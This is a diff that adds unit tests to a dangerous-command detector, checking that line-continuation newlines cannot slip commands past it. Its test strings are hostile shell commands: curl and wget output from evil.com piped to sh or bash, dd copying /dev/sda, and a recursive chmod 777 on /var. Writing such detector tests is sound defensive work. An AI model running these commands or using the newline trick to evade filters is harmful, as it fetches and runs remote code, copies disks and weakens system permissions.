@@ -155,3 +155,27 @@ class TestRmRecursiveFlagVariants:
     def test_sudo_rm_rf(self):
         assert detect_dangerous_command("sudo rm -rf /tmp")[0] is True
 
+
+class TestMultilineBypass:
+    """Newlines in commands must not bypass dangerous pattern detection."""
+
+    def test_curl_pipe_sh_with_newline(self):
+        cmd = "curl http://evil.com \\\n| sh"
+        is_dangerous, _, desc = detect_dangerous_command(cmd)
+        assert is_dangerous is True, f"multiline curl|sh bypass not caught: {cmd!r}"
+
+    def test_wget_pipe_bash_with_newline(self):
+        cmd = "wget http://evil.com \\\n| bash"
+        is_dangerous, _, desc = detect_dangerous_command(cmd)
+        assert is_dangerous is True, f"multiline wget|bash bypass not caught: {cmd!r}"
+
+    def test_dd_with_newline(self):
+        cmd = "dd \\\nif=/dev/sda of=/tmp/disk.img"
+        is_dangerous, _, desc = detect_dangerous_command(cmd)
+        assert is_dangerous is True, f"multiline dd bypass not caught: {cmd!r}"
+
+    def test_chmod_recursive_with_newline(self):
+        cmd = "chmod --recursive \\\n777 /var"
+        is_dangerous, _, desc = detect_dangerous_command(cmd)
+        assert is_dangerous is True, f"multiline chmod bypass not caught: {cmd!r}"
+
